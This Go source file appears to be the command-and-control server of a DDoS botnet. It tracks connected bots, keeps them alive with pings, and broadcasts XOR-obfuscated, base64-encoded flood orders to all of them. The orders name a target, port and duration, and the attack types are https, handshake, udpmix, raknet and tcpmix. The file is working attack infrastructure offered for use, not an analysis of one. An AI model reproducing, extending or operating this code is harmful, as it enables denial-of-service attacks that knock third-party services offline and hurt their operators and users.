package server

import (
	"encoding/base64"
	"fmt"
	"homo/network/config"
	"net"

	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
)

func GetBots() (int, string) {
	bots := []string{}
	for _, conn := range Conns {
		if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
			bots = append(bots, addr.IP.String()+":"+strconv.Itoa(addr.Port))
		}
	}
	return len(bots), strings.Join(bots, "\n\r")
}

func sendCmd(command_type string, target string, port string, duration string) {

	for _, conn := range Conns {
		var command string
		for _, i := range command_type + " " + target + " " + port + " " + duration {
			command += string(i ^ 29>>3)
		}

		_, err := conn.Write([]byte(base64.RawStdEncoding.EncodeToString([]byte(command))))

		if err != nil {
			color.HiWhite("[" + conn.RemoteAddr().String() + "] " + color.HiWhiteString("Error"))
			Conns = RemoveConn(Conns, conn)
			conn.Close()
		} else {
			color.HiWhite("[" + conn.RemoteAddr().String() + "] " + color.HiWhiteString("Command sent"))
		}
	}
}

func Https(target string, duration string, port string) {

	fmt.Println(strconv.FormatBool(config.GetConfig().Proxy.Useproxy))
	for _, conn := range Conns {
		var command string

		fmt.Println(strconv.FormatBool(config.GetConfig().Proxy.Useproxy))
		for _, i := range "https" + " " + target + " " + port + " " + duration + " " + strconv.FormatBool(config.GetConfig().Proxy.Useproxy) {
			command += string(i ^ 29>>3)
		}

		_, err := conn.Write([]byte(base64.RawStdEncoding.EncodeToString([]byte(command))))

		if err != nil {
			color.HiWhite("[" + conn.RemoteAddr().String() + "] " + color.HiWhiteString("Error"))
			Conns = RemoveConn(Conns, conn)
			conn.Close()
		} else {
			color.HiWhite("[" + conn.RemoteAddr().String() + "] " + color.HiWhiteString("Command sent"))
		}
	}

}

func Handshake(target string, duration string, port string) {
	sendCmd("handshake", target, port, duration)

}

func Udpmix(target string, duration string, port string) {
	sendCmd("udpmix", target, port, duration)
}

func Raknet(target string, duration string, port string) {
	sendCmd("raknet", target, port, duration)
}

func Tcpmix(target string, duration string, port string) {
	sendCmd("tcpmix", target, port, duration)
}

func Ping() {
	for {
		for _, conn := range Conns {
			_, e := conn.Write([]byte("ping"))
			if e != nil {
				Conns = RemoveConn(Conns, conn)
				conn.Close()
			}
		}
		time.Sleep(2 * time.Second)
	}
}
